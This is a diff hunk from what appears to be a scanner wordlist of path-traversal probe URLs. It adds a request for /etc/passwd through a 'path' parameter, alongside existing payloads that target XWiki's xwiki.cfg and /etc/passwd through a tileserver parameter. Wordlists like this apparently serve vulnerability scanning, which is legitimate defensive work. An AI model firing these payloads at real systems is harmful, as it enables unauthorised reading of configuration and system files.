@@ -871,3 +871,4 @@
 /xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg
 /bin/ssx/Main/WebHome?resource=../../WEB-INF/xwiki.cfg&minify=false
 /tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
+/download_work_dir_file?path=/etc/passwd
